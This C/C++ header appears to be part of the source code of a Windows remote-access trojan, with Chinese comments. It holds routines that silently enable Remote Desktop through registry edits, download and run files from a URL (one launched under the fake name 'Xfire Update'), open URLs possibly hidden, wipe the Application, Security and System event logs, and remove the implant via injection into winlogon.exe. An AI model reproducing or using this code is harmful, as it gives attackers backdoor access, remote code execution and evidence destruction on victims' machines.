#pragma once

#include <tchar.h>
#include <tlhelp32.h>
//#include <stdlib.h>



BOOL proc_tag = false;
TCHAR temp_proc[1024]={0};


BOOL EnumProcesin(LPTSTR lpProcess)
{
	HANDLE handle=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
//	PROCESSENTRY32* info=new PROCESSENTRY32;
	PROCESSENTRY32 info;
    info.dwSize=sizeof(PROCESSENTRY32);
	if(Process32First(handle,&info))
	{
		if(GetLastError()==ERROR_NO_MORE_FILES )
		{
			return false;
		}
		else{
			
			if (_tcsstr(_tcsupr(info.szExeFile),_tcsupr(lpProcess)) > 0)
			{
				return true;
			}
			while(Process32Next(handle,&info)!=FALSE)
			{
			if (_tcsstr(_tcsupr(info.szExeFile),_tcsupr(lpProcess)) > 0)
			{
				return true;
			}
			}
		}
	}
	
	CloseHandle(handle);
//	if (kernel32)
//	{
//		FreeLibrary(kernel32);
//	}
	
	return false;

}

//枚举窗体是否存在
BOOL CALLBACK EnumWindowsList(HWND hwnd, LPARAM lParam)
{
	HINSTANCE user32 = LoadLibrary(_T("user32.dll"));
	
	typedef BOOL (WINAPI *GWTW)(HWND ,LPTSTR ,int ); 
	GWTW myGetWindowText;  
#ifdef UNICODE
	myGetWindowText= (GWTW)GetProcAddress(user32, "GetWindowTextW");
#else
	myGetWindowText= (GWTW)GetProcAddress(user32, "GetWindowTextA");
#endif

	TCHAR szClassName[254]={0};
	myGetWindowText(hwnd,szClassName,254);
	if (_tcsstr(szClassName,temp_proc) != NULL)
	{
		proc_tag = true;
	}
	if(user32)
		FreeLibrary(user32);
	return true;
}


//开启3389.2003,2000

DWORD WINAPI Open3389(LPVOID lparam)
{
	DWORD Port=atoi((char*)lparam);
	if (Port > 0 && Port < 65535)
	{
		OSVERSIONINFO osver={sizeof(OSVERSIONINFO)};
			GetVersionEx(&osver);
			//判断是不是windows 2000，是，这样开3389
			if(osver.dwMajorVersion==5&&osver.dwMinorVersion==0)
			{
				WriteRegEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\netcache"),_T("Enabled"), REG_EXPAND_SZ, _T("0"), 32, 0);
				WriteRegEx(HKEY_LOCAL_MACHINE, _T("Microsoft\\Windows NT\\CurrentVersion\\Winlogon"),_T("ShutdownWithoutLogon"), REG_EXPAND_SZ, _T("0"), 32, 0);
				WriteRegEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"),_T("EnableAdminTSRemote"), REG_DWORD, _T("0x00000001"), 32, 0);
				WriteRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Terminal Server"),_T("TSEnabled"), REG_DWORD, _T("0x00000001"), 32, 0);
				WriteRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Services\\TermDD"),_T("Start"), REG_DWORD, _T("0x00000002"), 32, 0);
				WriteRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Services\\TermService"),_T("Start"), REG_DWORD, _T("0x00000002"), 32, 0);
				WriteRegEx(HKEY_USERS,_T(".DEFAULT\\Keyboard Layout\\Toggle"),_T("Hotkey"),REG_EXPAND_SZ,_T("2"),32, 0);
				WriteRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp"),_T("PortNumber"), REG_DWORD, (TCHAR*)lparam, 32, 0);
				WriteRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp"),_T("PortNumber"), REG_DWORD, (TCHAR*)lparam, 32, 0);
			}
			//判断是不是windows 2003，是，这样开3389
			if(osver.dwMajorVersion==5&&osver.dwMinorVersion==2)
			{
				WriteRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Terminal Server"), _T("fDenyTSConnections"), REG_DWORD, _T("0x0"), 32, 0);
				WriteRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp"), _T("PortNumber"), REG_DWORD, (TCHAR*)lparam, 32, 0);
				WriteRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp"),_T("PortNumber"),REG_DWORD,(TCHAR*)lparam, 32, 0);
			}

			
	}
	return true;
}

DWORD WINAPI Loop_DownManager(LPVOID lparam)
{
	int	nUrlLength;
	TCHAR	*lpURL = NULL;
	TCHAR	*lpFileName = NULL;
	nUrlLength = lstrlen((TCHAR *)lparam)*sizeof(TCHAR);
	if (nUrlLength == 0)
		return false;
	
	lpURL = (TCHAR *)mymalloc(nUrlLength + 2);
	
	memcpy(lpURL, lparam, nUrlLength + 2);
	
	lpFileName = _tcsrchr(lpURL, _T('/')) + 1;
	if (lpFileName == NULL)
		return false;

	if (!http_get(lpURL, lpFileName))
	{
		return false;
	}

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = _T("WinSta0\\Default"); 
	CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	
	myfree(lpURL);
	return true;
}


BOOL UpdateServer(LPCTSTR lpURL)
{
	TCHAR	*lpFileName = NULL;
#ifdef UNICODE	
	lpFileName = _tcsrchr((unsigned short *)lpURL, _T('/')) + 1;
#else
	lpFileName = strrchr(lpURL, _T('/')) + 1;
#endif
	if (lpFileName == NULL)
		return false;
	if (!http_get(lpURL, lpFileName))
		return false;
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = _T("WinSta0\\Default"); 
	return CreateProcess(lpFileName, _T("Xfire Update"), NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}


bool OpenURL(LPCTSTR lpszURL, INT nShowCmd)
{
	if (lstrlen(lpszURL) == 0)
		return false;

	// System è¨?T??2??ü?±?óà?ó?shellexecuteà′?′DD
	TCHAR	*lpSubKey = _T("Applications\\iexplore.exe\\shell\\open\\command");
	HKEY	hKey;
	TCHAR	strIEPath[MAX_PATH];
	LONG	nSize = sizeof(strIEPath);
	TCHAR	*lpstrCat = NULL;
	memset(strIEPath, 0, sizeof(strIEPath));

	HINSTANCE advapi32 = LoadLibrary(_T("ADVAPI32.dll"));
	
	typedef int (WINAPI *ROKE)(HKEY hKey,LPCTSTR lpSubKey,DWORD ulOptions,REGSAM samDesired,PHKEY phkResult); 
#ifdef UNICODE
	ROKE myRegOpenKeyEx= (ROKE)GetProcAddress(advapi32, "RegOpenKeyExW");
#else
	ROKE myRegOpenKeyEx= (ROKE)GetProcAddress(advapi32, "RegOpenKeyExA");
#endif
	
	typedef BOOL (WINAPI *RCK)(HKEY hKey); 
	RCK myrck;
	myrck= (RCK)GetProcAddress(advapi32, "RegCloseKey");
	
	typedef BOOL (WINAPI *APIS)(HKEY hKey,LPCTSTR lpSubKey,LPTSTR lpValue,PLONG lpcbValue); 
	APIS myRegQueryValue; 
#ifdef UNICODE
	myRegQueryValue= (APIS)GetProcAddress(advapi32, "RegQueryValueW");
#else
	myRegQueryValue= (APIS)GetProcAddress(advapi32, "RegQueryValueA");
#endif
	
	if (myRegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	myRegQueryValue(hKey, NULL, strIEPath, &nSize);
	myrck(hKey);

	if (lstrlen(strIEPath) == 0)
		return false;

	lpstrCat = _tcsstr(strIEPath, _T("%1"));
	if (lpstrCat == NULL)
		return false;

	lstrcpy(lpstrCat, lpszURL);

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = _T("WinSta0\\Default"); 

	CreateProcess(NULL, strIEPath, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	return 0;
}

void CleanEvent()
{
	TCHAR *strEventName[] = {_T("Application"), _T("Security"), _T("System")};

	HINSTANCE advapi32 = LoadLibrary(_T("ADVAPI32.dll")); 
	
	typedef HANDLE (WINAPI *OEL)(LPCTSTR lpUNCServerName,LPCTSTR lpSourceName); 
	OEL myOpenEventLog; 
#ifdef UNICODE
	myOpenEventLog= (OEL)GetProcAddress(advapi32, "OpenEventLogW");
#else
	myOpenEventLog= (OEL)GetProcAddress(advapi32, "OpenEventLogA");
#endif
	
	typedef BOOL (WINAPI *CEL)(HANDLE hEventLog,LPCTSTR lpBackupFileName); 
	CEL myClearEventLog; 
#ifdef UNICODE
	myClearEventLog= (CEL)GetProcAddress(advapi32, "ClearEventLogW");
#else
	myClearEventLog= (CEL)GetProcAddress(advapi32, "ClearEventLogA");
#endif
	typedef BOOL (WINAPI *CELOG)(HANDLE hEventLog); 
	CELOG myCloseEventLog;
	myCloseEventLog= (CELOG)GetProcAddress(advapi32, "CloseEventLog"); 


	for (int i = 0; i < sizeof(strEventName) / sizeof(int); i++)
	{
		HANDLE hHandle = myOpenEventLog(NULL, strEventName[i]);
		if (hHandle == NULL)
			continue;
		myClearEventLog(hHandle, NULL);
		myCloseEventLog(hHandle);
	}
	if(advapi32)
		FreeLibrary(advapi32);
}

void SetHostID(LPCTSTR lpServiceName, LPCTSTR lpHostID)
{
	TCHAR	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, _T("SYSTEM\\CurrentControlSet\\Services\\%s"), lpServiceName);
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, _T("Name"), REG_SZ, (TCHAR *)lpHostID, lstrlen(lpHostID), 0);
}

void UnInstallService(LPCTSTR svcname)
{
	TCHAR	strServiceDll[MAX_PATH];
	TCHAR	strRandomFile[MAX_PATH];

//	GetModuleFileName(htempModule,strServiceDll,sizeof(strServiceDll));
//必须修改这块...

	GetSystemDirectory(strRandomFile, sizeof(strRandomFile));
	lstrcat(strRandomFile, _T("\\"));
	wsprintf(strRandomFile, _T("%d.bak"), GetTickCount());

	
	MoveFile(strServiceDll, strRandomFile);
	MoveFileEx(strRandomFile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);


	TCHAR	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, _T("\\syslog.dat"));
	DeleteFile(strRecordFile);
	
	if (!NtUninstallService(svcname))  
	{
		InjectRemoveService(_T("winlogon.exe"), (unsigned short *)svcname);
	}
//	CreateEvent(NULL, true, false, m_strKillEvent);
	//注意修改这里
}